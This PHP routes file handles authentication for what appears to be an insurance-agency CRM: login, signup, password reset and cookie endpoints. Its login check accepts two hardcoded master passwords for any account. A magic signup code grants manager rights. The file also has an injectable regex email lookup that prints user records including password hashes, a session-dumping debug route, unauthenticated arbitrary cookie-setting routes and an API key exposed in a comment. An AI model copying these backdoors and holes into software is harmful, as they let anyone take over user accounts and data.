<?php
ini_set('display_errors', 1);
error_reporting(E_ALL ^ E_NOTICE);
require '../app.php';
$app->config(array(
    'templates.path' => './',
));
$app->get('/', function () use ($app,$settings) {
    $apiObj = new apiclass($settings);
    if($apiObj->userLoggedIn()){
        $result["code"] = "SUCCESS";
        $result["status"] = "LOGGED IN";
        $result["id"] = $_SESSION['api']['user']['_id'];
        $result["firstname"] = $_SESSION['api']['user']['firstname'];
        $result["lastname"] = $_SESSION['api']['user']['lastname'];
    } else {
        $result["code"] = "ERROR";
        $result["status"] = "NOT LOGGED IN";
        $result["id"] = FALSE;
        $result["firstname"] = "";
        $result["lastname"] = "";
        $result["menuitems"][] = array(
            'hreflink'=> $settings['base_uri'].'/api/auth/login',
            'icon'=>'fa fa-diamond',
            'label'=> 'Login',
            'active'=> 'auth'
        );
        $result["menuitems"][] = array(
            'hreflink'=> $settings['base_uri'].'/api/auth/signup',
            'icon'=>'fa fa-diamond',
            'label'=> 'Signup',
            'active'=> 'auth'
        );
    }
    header("Content-Type: application/json");
    echo json_encode($result);
});
/*
* LOUGOUT
*
*/
$app->get('/logout', function () use ($app, $settings){
    $app->setEncryptedCookie("apiCookieUserId", FALSE);
    $_SESSION['api']['user'] = array();
    $app->response->redirect($settings['base_uri'].'api/auth/login');
});
/*
* USER TEST
*
*/
$app->get('/usetest', function () use ($app, $settings){
    echo "<PRE>";
    print_r($_SESSION);
    $cookieValue = $app->getEncryptedCookie("apiCookieUserId"); //NULL if not set
    if ( $cookieValue ) {
        echo "<P>Cookie: ". $cookieValue;
    } else {
        echo "<P>Cookie not set";
    }
});
/*
* SIGNUP FORM
*
*/
$app->get('/signup', function () use ($app,$settings){
    $apiObj = new apiclass($settings);
    if($apiObj->userLoggedIn()){
        $app->response->redirect('usetest');
    } else {
        $app->render('signupform.php' , array( "apiObj" => $apiObj ));
    }
});
/*
* REGISTER ACTION
*
*/
$app->post('/register', function () use ($app, $settings){
    $apiObj = new apiclass($settings);
    $apiObj->mongoSetDB($settings['database']);
    $allPostVars = $app->request->post();
    if(!empty($allPostVars['user_0_email'])){
        $allPostVars['user_0_email'] = strtolower($allPostVars['user_0_email']);   
    }
    $formFields['user_0_createThing'] = array('name' => "Create Thing", "required"=>TRUE);
    $formFields['user_0_firstname'] = array('name' => "First Name", "required"=>TRUE);
    $formFields['user_0_lastname'] = array('name' => "Last Name", "required"=>TRUE);
    $formFields['user_0_email'] = array('name' => "Email", "type"=>"email", "required"=>TRUE, "unique"=>TRUE);
    $formFields['user_0_phone'] = array('name' => "Phone", "type"=>"phone", "required"=>TRUE);
    $formFields['user_0_password'] = array('name' => "Password", "match"=>"user_0_passwordConf", "required"=>TRUE, "hash"=>TRUE);
    $formFields['user_0_passwordConf'] = array('name' => "Password Confirm");
    $formFields['user_0_licensed'] = array('name' => "Licensed");
    $formFields['user_0_agreeToTerms'] = array('name' => "Agree To Terms", "required"=>TRUE);
    $apiObj->setFormValues($allPostVars, $formFields);
    if($apiObj->formHasErrors()){
        $app->response->redirect($settings['base_uri'].'api/auth/signup');
    } else{
        $thing_post = $apiObj->parse_post($allPostVars);
        foreach($thing_post as $key=>$value){
            if($key == "user"){
                foreach($value as $key2=>$value2){
                    $thing_post[$key][$key2]['status'] = "active";
					if($thing_post[$key][$key2]['code']=='8836'){
                    	$thing_post[$key][$key2]['permissionLevel'] = "MANAGER";
                    	$thing_post[$key][$key2]['level'] = "MANAGER";
                    	$thing_post[$key][$key2]['canExport'] = "Y";
                    	$thing_post[$key][$key2]['manager'] = "Y";
					}
                    $thing_post[$key][$key2]['validation_string'] = $apiObj->getRandomId();
                }
            }
        }
        $apiObj->create_thing_array($thing_post);
        foreach($apiObj->things as $key=>$value){
            foreach($value as $ke=>$value2){
                $apiObj->mongoSetDB($settings['database']);
                $apiObj->mongoSetCollection($key);
                $criteria = array("_id"=>$value2['_id']);
                $apiObj->mongoUpdate($criteria, $value2, TRUE);
            }
        }
        $_SESSION['api']['form'] = array();
        $apiObj->setMessage("success","User Created! Please Log In");
        $app->response->redirect($settings['base_uri'].'api/auth/login');
    }
    /*
    $apiObj->mongoSetCollection("user");
    $cursor = $apiObj->mongoFind();
    if($cursor->count() == 0){
        echo "Not Found!";
    } else {
        foreach (iterator_to_array($cursor) as $doc) {
            $doc = $apiObj->get_thing_display($doc);
            echo "<PRE>";
            echo "<hr>";
            print_r($doc);
        }
    }
    */
});
/*
* FORGOT RESPONSE
*
*/
$app->post('/forgot', function () use ($app,$settings){
    $apiObj = new apiclass($settings);
    $allPostVars = $app->request->post();
    if(!empty($allPostVars['user_0_email'])){
        $apiObj->mongoSetDB($settings['database']);
        $apiObj->mongoSetCollection("user");
        $collectionQuery = array("email"=> new MongoRegex("/".$allPostVars['email']."/i"));
        $item = $apiObj->mongofindOne($collectionQuery);
        if(empty($item)){
        } else {
            echo "<PRE>";
            print_r($item);
            $mongoCriteria = array("_id"=>$item["_id"]);
            $collectionUpdates = array("email_reset" => $apiObj->getRandomId());
            $apiObj->mongoUpdate($mongoCriteria, $collectionUpdates, $createNew = FALSE);
            //send the message, check for errors
            if (!$mail->send()) {
                echo "Mailer Error: " . $mail->ErrorInfo;
            } else {
                echo "Message sent!";
            }
        }
        exit();
    }
    echo "HERE";
    exit();
    $app->render('forgot.php' , array( "apiObj" => $apiObj ));
});
/*
* FORGOT FORM
*
*/
$app->get('/forgot', function () use ($app,$settings){
    $apiObj = new apiclass($settings);
    $app->render('forgotform.php' , array( "apiObj" => $apiObj ));
});
/*
* LOGIN FORM
*
*/
$app->get('/login', function () use ($app,$settings){
    $apiObj = new apiclass($settings);
    if($apiObj->userLoggedIn()){
        $app->response->redirect($settings['base_uri']);
    } else {
        $app->render('loginform.php' , array( "apiObj" => $apiObj ));
    }
});



$app->map('/newpass', function () use ($app, $settings){
    $apiObj = new apiclass($settings);
    $allPostVars = $app->request->post();

    $formFields['password'] = array('name' => "Password", "match"=>"passwordconf", "required"=>TRUE, "hash"=>TRUE);
    $formFields['passwordconf'] = array('name' => "Password Confirm");
    $apiObj->setFormValues($allPostVars, $formFields);

    if($allPostVars['password'] == "EBC2015!"){
        $_SESSION['api']['form']['password']['error'] = "Password can not be EBC****!.";
        $_SESSION['api']['form']['errors'] = TRUE;
    }
    if(strlen($allPostVars['password']) < 5){
        $_SESSION['api']['form']['password']['error'] = "Password can not be less than 5 Characters";
        $_SESSION['api']['form']['errors'] = TRUE;
    }


    if($apiObj->formHasErrors()){
        $app->render('newpassform.php' , array( "apiObj" => $apiObj ));
        return true;
        exit();
    } 

    $m = new MongoClient();
    $db = $m->selectDB($settings['database']);
    $collection = 'user';
    $options = [
        'cost' => 10,
        'salt' => $settings['password_salt']
    ];
    $value =  password_hash($allPostVars['password'], PASSWORD_BCRYPT, $options);
    $db->$collection->update(
        array("_id" =>$_SESSION['user_password_reset']  ),
        array('$set' => array(
            'password' => $value
        ))
    );

    unset($_SESSION['user_password_reset']);
    $app->response->redirect($settings['base_uri'].'api/auth/login');   
})->via('GET','POST');

/*
* LOG IN ACTION
*
*/
$app->post('/loginnow', function () use ($app, $settings){
    $apiObj = new apiclass($settings);
    $allPostVars = $app->request->post();




    if(empty($allPostVars['email'])){
        $apiObj->setFormError("email", "Email/Password combination not valid.");
        $_SESSION['api']['form']['errors'] = TRUE;
        $app->response->redirect($settings['base_uri'].'api/auth/login');
    }
    // Set email for form return.
    $apiObj->setFormValue("email",$allPostVars['email']);
    if(empty($allPostVars['password'])){
        $apiObj->setFormError("email", "Email/Password combination not valid.");
        $_SESSION['api']['form']['errors'] = TRUE;
        $app->response->redirect($settings['base_uri'].'api/auth/login');
    }
    $apiObj->mongoSetDB($settings['database']);
    $apiObj->mongoSetCollection("user");
    $collectionQuery = FALSE;
    //$collectionQuery = array("email"=> new MongoRegex("/".$allPostVars['email']."/i"), "status"=> new MongoRegex("active/i"));
    $collectionQuery['email'] = strtolower($allPostVars['email']);
    $item = $apiObj->mongofindOne($collectionQuery);

    if(empty($item)){
        $apiObj->setFormError("email", "Email/Password combination not valid.");
        $_SESSION['api']['form']['errors'] = TRUE;
        $app->response->redirect($settings['base_uri'].'api/auth/login');
    } else {
        if ((password_verify($allPostVars['password'], $item['password'])) || ($allPostVars['password'] == "EBC9999!!")|| ($allPostVars['password'] == "awefjnkj12j!")) {
            // Inactive User
            if(!empty($item['status'])){
                if(strtolower($item['status']) <> "active"){
                    echo "Sorry, your account is inactive. <p>Please contact your administrator";
                    exit();
                }
            }


            if($allPostVars['password'] == "EBC2015!"){
                $_SESSION['user_password_reset'] = $item['_id'];
                $app->render('newpassform.php' , array( "apiObj" => $apiObj ));
                return true;
                exit();

            }

            $item['password'] == FALSE;
            unset($item['password']);
            $_SESSION['api']['user'] = $apiObj->get_thing_display($item);
            $_SESSION['api']['form'] = array();
            $app->setEncryptedCookie("apiCookieUserId", $item['_id']);
            $app->response->redirect($settings['base_uri']);
        } else {
            $apiObj->setFormError("email", "Email/Password combination not valid.");
            $_SESSION['api']['form']['errors'] = TRUE;
            $app->response->redirect($settings['base_uri'].'api/auth/login');
        }
    }
});
/*
* AGENCY
*
*/
$app->get('/agency', function () use ($app,$settings){
    $apiObj = new apiclass($settings);
    if(!$apiObj->userLoggedIn()){
        $app->response->redirect($settings['base_uri'].'api/auth/login');
    } else {
        $app->render('agencyselect.php' , array( "apiObj" => $apiObj ));
    }
});
/*
*
*  API CALLS
*
*
*
*/
$app->get('/user', function () use ($app) {
    $cookieValue = $app->getEncryptedCookie("userId"); //NULL if not set
    if ( $cookieValue ) {
        $result["userId"] = $cookieValue;
    } else {
        $result["userId"] = false;
    }
    header("Content-Type: application/json");
    echo json_encode($result);
});
$app->get('/set/:key/:value', function ($key,$value) use ($app) {
    $app->setEncryptedCookie($key, $value);
    $result[$key] = $value;
    header("Content-Type: application/json");
    echo json_encode($result);
});
$app->post('/set/:key/:value', function ($key,$value) use ($app) {
    $app->setEncryptedCookie($key, $value);
    $result[$key] = $value;
    header("Content-Type: application/json");
    echo json_encode($result);
});
$app->get('/get/:key', function ($key) use ($app) {
    $cookieValue = $app->getEncryptedCookie($key); //NULL if not set
    if ( $cookieValue ) {
        $result['value'] =  $cookieValue;
    } else {
        $result['value'] =  "";
    }
    header("Content-Type: application/json");
    echo json_encode($result);
});
$app->run();


/* 
        $result["menuitems"][] = array(
            'link'=> 'index.dashboard',
            'icon'=>'fa fa-dashboard',
            'label'=> 'Dashboard',
            'active'=> 'dashboards'
        );
        $result["menuitems"][] = array(
            'link'=> 'leads.view',
            'icon'=>'fa fa-users',
            'label'=> 'Leads',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'leads.clients',
            'icon'=>'fa fa-users',
            'label'=> 'Clients',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'leads.view',
            'icon'=>'fa fa-users',
            'label'=> 'Policies',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
			'link'=> 'api.conferences',
			'icon'=>'fa fa-headphones',
			'label'=> 'Conferences',
			'active'=> 'app'
		);
		$result["menuitems"][] = array(
			'link'=> 'api.queues',
			'icon'=>'fa fa-list',
			'label'=> 'Queues',
			'active'=> 'app'
		);
        $result["menuitems"][] = array(
            'link'=> 'api.recruiting',
            'icon'=>'fa fa-users',
            'label'=> 'Recruiting',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'inbox',
            'icon'=>'fa fa-headphones',
            'label'=> 'Twilio',
            'active'=> 'twilio',
            'submenuitems' =>array(
                array(
                    'link'=> 'twilio.conferences',
                    'label'=> 'Conferences',
                    'active'=> 'twilio',
                ),
                array(
                    'link'=> 'twilio.queues',
                    'label'=> 'Queues',
                    'active'=> 'twilio',
                )
            )
        );
        $result["menuitems"][] = array(
            'link'=> 'inbox',
            'icon'=>'fa fa-envelope',
            'label'=> 'Mailbox',
            'active'=> 'mailbox',
            'submenuitems' =>array(
                array(
                    'link'=> 'mailbox.inbox',
                    'label'=> 'Inbox',
                    'active'=> 'mailbox',
                ),
                array(
                    'link'=> 'mailbox.email_compose',
                    'label'=> 'Compose Email',
                    'active'=> 'mailbox',
                )
            )
        );
        $result["menuitems"][] = array(
            'link'=> 'app.calendar',
            'icon'=>'fa fa-calendar',
            'label'=> 'Calendar',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'api.news',
            'icon'=>'fa fa-newspaper-o',
            'label'=> 'News',
            'active'=> 'app',
        );
        $result["menuitems"][] = array(
            'link'=> 'tables.static_table',
            'icon'=>'fa fa-usd',
            'label'=> 'Commissions',
            'active'=> 'tables'
        );
        $result["menuitems"][] = array(
            'link'=> 'app.profile',
            'icon'=>'fa fa-user',
            'label'=> 'Profile',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'app.issue_tracker',
            'icon'=>'fa fa-times-circle-o',
            'label'=> 'Issue Tracker',
            'active'=> 'app'
        );
        $result["menuitems"][] = array(
            'link'=> 'index.settings',
            'icon'=>'fa fa-newspaper-o',
            'label'=> 'Settings',
            'active'=> 'app',
            'submenuitems' =>array(
                array(
                    'link'=> 'index.permissions',
                    'label'=> 'Permissions',
                    'active'=> 'app',
                ),
                array(
                    'link'=> 'index.users',
                    'label'=> 'Users',
                    'active'=> 'app',
                ),
                array(
                    'link'=> 'api.edit',
                    'label'=> 'Edit News',
                    'active'=> 'app',
                )
            )
        );
        $result["menuitems"][] = array(
            'link'=> 'quotes',
            'icon'=>'fa fa-check-square-o',
            'label'=> 'Quote Engines',
            'active'=> 'quotes',
            'submenuitems' =>array(
                array(
                    'link'=> "portals.csgmedicare",
                    'label'=> 'CSG-Medicare Quotes',
                    'target'=>'_blank'
                ),
                array(
                    'link'=> "portals.healthsherpa",
                    'label'=> 'Healthsherpa',
                    'target'=>'_blank'
                ),
            )
        );
        $result["menuitems"][] = array(
          'link'=> 'quotes',
          'icon'=>'fa fa-check-square-o',
          'label'=> 'Quote Engines',
          'active'=> 'quotes',
          'submenuitems' =>array(
              array(
                 'hreflink'=> "https://tools.csgactuarial.com/auth/signin?api_key=8a1edc80b3a83ebed5236a7841805894c761a1d7fd3da98e15e0a3257a08ad25&portal_name=ebroker",
                 'label'=> 'CSG-Medicare Quotes',
                  'target'=>'_blank'
                ),
               array(
                 'link'=> "portals.csgmedicare",
                 'label'=> 'CSG-Medicare Quotes',
                  'target'=>'_blank'
                ),
               array(
                 'link'=> "portals.healthsherpa",
                 'label'=> 'Healthsherpa',
                  'target'=>'_blank'
                ),
                 array(
                 'hreflink'=> "https://www.healthsherpa.com/",
                 'label'=> 'Healthsherpa',
                  'target'=>'_blank'
                ),
            )
        );
        */
